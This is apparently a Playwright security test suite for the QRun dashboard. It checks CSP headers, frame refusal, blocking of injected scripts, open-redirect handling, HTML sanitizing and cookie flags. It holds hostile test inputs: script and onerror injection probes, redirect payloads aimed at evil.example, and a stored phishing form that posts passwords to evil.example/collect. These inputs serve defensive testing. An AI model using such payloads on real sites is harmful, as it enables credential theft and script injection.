/*
 * Copyright 2026 QRun.IO, Inc.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at https://www.apache.org/licenses/LICENSE-2.0
 */

// Dashboard security headers (QRun-IO/qqq#695) and the fixes from the Next security
// review (QRun-IO/qqq#696), against the shared sample backend serving the export.
import { createServer } from 'node:http'
import type { AddressInfo } from 'node:net'
import type { Page } from '@playwright/test'
import { expect, open, test } from '../../support/fixtures'
import { ACCEPTANCE_BACKEND_URL } from '../../support/ports'
import { allowBlockedByPolicy, customComponentOrigins, inlineScriptHashes, parsePolicy, POLICY_DIRECTIVES } from './support/csp'
import { allowExternalQuickSightWidget, listCell, navigation } from './support/ui'

/**
 * Another web site on its own loopback origin (a real server: Chromium's local network access
 * checks refuse loopback frames in pages without a network address), so only the dashboard's
 * own headers can refuse the frame.
 *
 * @param body - The page HTML.
 * @returns The page URL and a function that stops the server.
 */
async function serveOtherSite(body: string): Promise<{ url: string; close: () => Promise<void> }> {
  const server = createServer((_request, response) => {
    response.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' })
    response.end(body)
  })
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  const { port } = server.address() as AddressInfo
  return { url: `http://127.0.0.1:${port}/`, close: () => new Promise<void>((resolve) => server.close(() => resolve())) }
}

test.describe('dashboard security headers', () => {
  test('[SEC-038] every dashboard document gets the strict policy, which allows exactly its own inline scripts', async ({ page, backend, diagnostics }) => {
    const componentOrigins = await customComponentOrigins(backend.api)
    for (const [path, status] of [['/login', 200], ['/token', 200], ['/app', 200], ['/app/person', 200], ['/app/person/2', 200], ['/app/person/2/edit', 200], ['/app/person/2/no/such/page', 404]] as const) {
      const response = await page.request.get(path)
      expect(response.status(), path).toBe(status)
      const headers = response.headers()
      const policy = parsePolicy(headers['content-security-policy'])
      expect(Object.keys(policy), path).toEqual(POLICY_DIRECTIVES)
      expect(policy['default-src']).toEqual(["'self'"])
      expect(policy['style-src']).toEqual(["'self'", "'unsafe-inline'"])
      expect(policy['connect-src'], 'MOCK authentication calls no identity provider').toEqual(["'self'"])
      expect(policy['object-src']).toEqual(["'none'"])
      expect(policy['base-uri']).toEqual(["'self'"])
      expect(policy['form-action']).toEqual(["'self'"])
      expect(policy['frame-ancestors']).toEqual(["'none'"])
      // script-src: this origin, the configured custom component bundles, and one hash per inline script
      const [self, ...rest] = policy['script-src']
      expect(self).toBe("'self'")
      expect(rest.filter((source) => !source.startsWith("'sha256-")).sort()).toEqual([...componentOrigins].sort())
      expect(rest.filter((source) => source.startsWith("'sha256-")).sort(), path).toEqual(inlineScriptHashes(await response.text()).sort())
      expect(rest.some((source) => /unsafe-(inline|eval)/.test(source))).toBe(false)
      expect(headers['x-frame-options']).toBe('DENY')
      expect(headers['referrer-policy']).toBe('strict-origin-when-cross-origin')
      expect(headers['x-content-type-options']).toBe('nosniff')
      expect(headers['permissions-policy'].split(/,\s*/)).toEqual(expect.arrayContaining(['camera=()', 'microphone=()', 'geolocation=()', 'payment=()', 'usb=()']))
    }
    expect(componentOrigins.length).toBeGreaterThan(0)

    // build assets are not documents: no policy, but the other headers
    const login = await (await page.request.get('/login')).text()
    const asset = login.match(/<script[^>]*\ssrc="(\/_next\/static\/[^"]+\.js)"/)?.[1]
    expect(asset).toBeTruthy()
    const assetHeaders = (await page.request.get(asset!)).headers()
    expect(assetHeaders['content-security-policy']).toBeUndefined()
    expect(assetHeaders['x-content-type-options']).toBe('nosniff')

    // the real pages run under the policy: the inline bootstrap was allowed, nothing was blocked
    allowExternalQuickSightWidget(diagnostics)
    await open(page, '/app/person/2')
    await expect(page.getByRole('heading', { name: /Blair/ }).first()).toBeVisible()
    expect(await page.evaluate(() => Array.isArray((self as unknown as { __next_f?: unknown }).__next_f))).toBe(true)
    await listCellAfterNavigation(page)
    expect(diagnostics.cspViolations).toEqual([])
  })

  test('[SEC-038] another web site cannot frame the dashboard', async ({ page, backend, diagnostics }) => {
    void backend
    // each engine reports the refused frame in its own words, some as a failed frame request
    diagnostics.allow(/frame-ancestors|X-Frame-Options/)
    diagnostics.allow(`request: GET ${ACCEPTANCE_BACKEND_URL}/login `)
    const otherSite = await serveOtherSite(`<!doctype html><title>Other site</title><h1>Other site</h1><iframe id="victim" src="${ACCEPTANCE_BACKEND_URL}/login"></iframe>`)
    try {
      const framedRequest = page.waitForResponse((response) => response.url().startsWith(`${ACCEPTANCE_BACKEND_URL}/login`))
      await page.goto(otherSite.url, { waitUntil: 'load' })
      await expect(page.getByRole('heading', { name: 'Other site' })).toBeVisible()
      // the dashboard answered, with the headers that forbid showing it in a frame
      const framed = await framedRequest
      expect(framed.status()).toBe(200)
      expect(parsePolicy(framed.headers()['content-security-policy'])['frame-ancestors']).toEqual(["'none'"])
      expect(framed.headers()['x-frame-options']).toBe('DENY')
      await page.waitForTimeout(1_000)
      await expect(page.frameLocator('#victim').locator('[data-qqq-id="login-card"]')).toHaveCount(0)
      await expect(page.frameLocator('#victim').getByText(/Signing in|Unable to sign in|You have signed out/)).toHaveCount(0)
      for (const frame of page.frames().filter((candidate) => candidate !== page.mainFrame())) {
        expect(await frame.locator('[data-qqq-id="login-card"]').count()).toBe(0)
      }
    } finally {
      await otherSite.close()
    }
  })

  test('[SEC-038] script injected into a page is refused and reported', async ({ page, backend, diagnostics }) => {
    void backend
    allowExternalQuickSightWidget(diagnostics)
    // the violation events, and each engine's console report of them (all name script-src)
    diagnostics.allow(/^csp: script-src/)
    diagnostics.allow(/^console: .*script-src/)
    await open(page, '/app/person/2')
    await expect(page.getByRole('heading', { name: /Blair/ }).first()).toBeVisible()
    const ran = await page.evaluate(async () => {
      const probe = window as unknown as { __qqqProbe?: string }
      const script = document.createElement('script')
      script.textContent = "window.__qqqProbe = 'inline script ran'"
      document.body.appendChild(script)
      const holder = document.createElement('div')
      holder.innerHTML = '<img alt="" src="data:," onerror="window.__qqqProbe = \'event handler ran\'">'
      document.body.appendChild(holder)
      await new Promise((resolve) => setTimeout(resolve, 500))
      return probe.__qqqProbe ?? null
    })
    expect(ran).toBeNull()
    await expect.poll(() => diagnostics.cspViolations.filter((violation) => /^script-src/.test(violation)).length).toBeGreaterThanOrEqual(2)
    expect(diagnostics.cspViolations.every((violation) => /^script-src/.test(violation))).toBe(true)
  })

  test('[SEC-040] origins the application configures are allowed and nothing else: QuickSight embed, images, audio and custom components', async ({ page, backend, diagnostics }) => {
    const [componentOrigin] = await customComponentOrigins(backend.api)
    const policy = parsePolicy((await page.request.get('/app/widgetGallery')).headers()['content-security-policy'])
    // added by the application's override hook (the fixture's loopback service) ...
    expect(policy['frame-src']).toEqual(["'self'", 'https://*.quicksight.aws.amazon.com', componentOrigin])
    expect(policy['img-src']).toEqual(["'self'", 'data:', 'blob:', 'https:', componentOrigin])
    expect(policy['media-src']).toEqual(["'self'", 'data:', 'blob:', componentOrigin])
    // ... and derived from metadata: the QuickSight widget and the custom component's bundle
    expect(policy['script-src'].filter((source) => !source.startsWith("'sha256-"))).toEqual(["'self'", componentOrigin])
    expect(policy['connect-src']).toEqual(["'self'"])

    await open(page, '/app/greetingsApp')
    const embedded = page.frameLocator('[data-qqq-id="quicksight-QuickSightChartRenderer"]')
    await expect(embedded.getByRole('heading', { name: 'Owned embedded chart' })).toBeVisible()

    // the gallery's deliberately missing bundle (WID-062) is a 404, not a policy violation
    diagnostics.allow('/missing-extension.js')
    diagnostics.allow('the server responded with a status of 404')
    await open(page, '/app/widgetGallery')
    await expect(page.locator('[data-qqq-id="custom-component-error-accCustomComponentMissing"]')).toHaveText('Error loading MissingOwnedComponent')
    await expect(page.locator('[data-qqq-id="custom-component-accCustomComponent"]')).toHaveText('Loaded component: Owned Custom Component / Owned component value')

    await open(page, '/app/widgetBlocks')
    const image = page.locator('img[src$="/owned-image.png"]').first()
    await expect(image).toBeVisible()
    await expect.poll(() => image.evaluate((element: HTMLImageElement) => element.complete && element.naturalWidth > 0)).toBe(true)
    await expect(page.locator('audio[src$="/owned-audio.wav"]')).toHaveCount(1)
    expect(diagnostics.cspViolations).toEqual([])

    // an origin the application did not configure stays blocked
    // (browsers report a cross-origin blocked URL by its origin)
    const elsewhere = 'http://127.0.0.1:8/embed.html'
    allowBlockedByPolicy(diagnostics, 'http://127.0.0.1:8')
    await page.evaluate((src) => {
      const frame = document.createElement('iframe')
      frame.src = src
      document.body.appendChild(frame)
    }, elsewhere)
    await expect.poll(() => diagnostics.cspViolations.join('\n')).toMatch(/^frame-src http:\/\/127\.0\.0\.1:8\b/m)
  })
})

test.describe('security review fixes (QRun-IO/qqq#696)', () => {
  test('[SEC-024] returnTo values that normalize to another origin land on /app', async ({ page, backend, diagnostics }) => {
    void backend
    allowExternalQuickSightWidget(diagnostics)
    for (const target of ['/.//evil.example/steal', '/..//evil.example', '/app/..//evil.example', '/app/../\\evil.example']) {
      await open(page, `/login?returnTo=${encodeURIComponent(target)}`)
      await expect(page).toHaveURL(/127\.0\.0\.1:\d+\/app\/?$/)
      await page.waitForLoadState('networkidle')
    }
  })

  test('[SEC-042] stored HTML cannot add forms, style sheets or page-covering overlays', async ({ page, backend, diagnostics }) => {
    void diagnostics
    const overlay = '<div style="position: fixed; inset: 0; z-index: 9999; background: white">Your session expired. Sign in again.</div>'
    const phishing = '<form action="https://evil.example/collect" method="post"><input name="password" type="password"><button>Sign in</button></form>'
    const restyle = '<style>main { display: none }</style>'
    const response = await backend.api.post('/data/fieldLab', { multipart: { name: 'Hostile Html', htmlValue: `<p>Kept <b>bold</b></p>${overlay}${phishing}${restyle}` } })
    expect(response.status(), await response.text()).toBe(200)
    const id = String((await response.json()).records[0].values.id)
    // stored as entered; the UI sanitizes when rendering
    expect((await backend.sql(`select html_value from field_lab where id = ${id}`))[0].html_value).toContain('<form')

    await page.goto(`/app/fieldLab/${id}`, { waitUntil: 'domcontentloaded' })
    await expect(page.getByRole('heading', { level: 1, name: 'Hostile Html' })).toBeVisible()
    const value = page.locator('[data-qqq-id="field-value-htmlValue"]').first()
    await expect(value.locator('b')).toHaveText('bold')
    await expect(value).toContainText('Your session expired. Sign in again.')
    await expect(value.locator('form, input, button, style')).toHaveCount(0)
    expect(await value.locator('div').first().evaluate((element) => getComputedStyle(element).position)).toBe('static')
    await expect(page.locator('main')).toBeVisible()
    expect(await page.evaluate(() => [...document.querySelectorAll('body *')].filter((element) => getComputedStyle(element).position === 'fixed'
      && (element.textContent ?? '').includes('Your session expired')).length)).toBe(0)
    await expect(page.locator('input[name="password"]')).toHaveCount(0)
  })

  test('[SEC-043] a different user signing in on the same browser never sees the previous user\'s recent records', async ({ page, backend, diagnostics }) => {
    allowExternalQuickSightWidget(diagnostics)
    const recentPet = page.locator('[data-qqq-id="dashboard-recent-1"]').filter({ hasText: 'Charlie' })
    await open(page, '/app/pet/1')
    await expect(page.getByRole('heading', { name: /Charlie/ }).first()).toBeVisible()
    await open(page, '/app')
    await expect(recentPet).toBeVisible()
    await expect(recentPet).toHaveAttribute('href', /^\/app\/pet\/1\/?$/)
    // the same identity keeps its list across a reload
    await page.reload()
    await expect(recentPet).toBeVisible()

    // no logout: the next session in this browser belongs to someone else
    await backend.setPersona('admin', 'bob')
    await page.reload()
    await expect(page.locator('[data-qqq-id="dashboard-home"]')).toBeVisible()
    await expect((await navigation(page)).locator('[data-qqq-id="sidebar-user-name"]')).toContainText('Bob')
    await expect(page.locator('[data-qqq-id^="dashboard-recent-"]')).toHaveCount(0)
    expect(await page.evaluate(() => localStorage.getItem('qqq-recent-records') ?? '')).not.toContain('/app/pet/1')
    await open(page, '/app/person')
    await expect(listCell(page, 'Person', 'Avery')).toBeVisible()
  })

  test('[SEC-044] session cookies are SameSite=Lax and Secure behind HTTPS', async ({ page, backend, diagnostics, context }) => {
    allowExternalQuickSightWidget(diagnostics)
    // manageSession issues sessionUUID; every API call refreshes the mock sessionId
    const cookieFrom = async (path: string, name: string, headers: Record<string, string> = {}) => {
      const response = await fetch(`${ACCEPTANCE_BACKEND_URL}${path}`, path.endsWith('manageSession')
        ? { method: 'POST', headers: { 'Content-Type': 'application/json', Cookie: `sessionId=${backend.sessionId}`, ...headers }, body: JSON.stringify({ accessToken: 'acceptance' }) }
        : { headers: { Cookie: `sessionId=${backend.sessionId}`, ...headers } })
      expect(response.status, path).toBe(200)
      const cookie = response.headers.getSetCookie().find((value) => value.startsWith(`${name}=`))
      expect(cookie, `${path} sets ${name}`).toBeTruthy()
      return cookie!
    }
    for (const [path, name] of [['/qqq/v1/manageSession', 'sessionUUID'], ['/qqq/v1/metaData', 'sessionId']]) {
      const plain = await cookieFrom(path, name)
      expect(plain).toMatch(/;\s*Path=\/(;|$)/i)
      expect(plain).toMatch(/;\s*SameSite=Lax/i)
      expect(plain, 'plain HTTP keeps working: no Secure flag').not.toMatch(/;\s*Secure/i)
      const proxied = await cookieFrom(path, name, { 'X-Forwarded-Proto': 'https' })
      expect(proxied).toMatch(/;\s*SameSite=Lax/i)
      expect(proxied).toMatch(/;\s*Secure/i)
    }

    // the browser stores the dashboard's session cookies as SameSite=Lax
    await open(page, '/app/person')
    await expect(listCell(page, 'Person', 'Avery')).toBeVisible()
    const jar = (await context.cookies(ACCEPTANCE_BACKEND_URL)).filter((cookie) => cookie.name === 'sessionUUID' || cookie.name === 'sessionId')
    expect(jar.map((cookie) => cookie.name).sort()).toEqual(['sessionId', 'sessionUUID'])
    for (const cookie of jar) expect(cookie.sameSite, cookie.name).toBe('Lax')
  })
})

/**
 * Proves client-side navigation works under the policy (router payload fetches are
 * same-origin and no inline script is needed after the first document).
 *
 * @param page - The page on a record view.
 */
async function listCellAfterNavigation(page: Page) {
  const sidebar = await navigation(page)
  await sidebar.getByRole('link', { name: 'Person', exact: true }).click()
  await expect(listCell(page, 'Person', 'Avery')).toBeVisible()
}
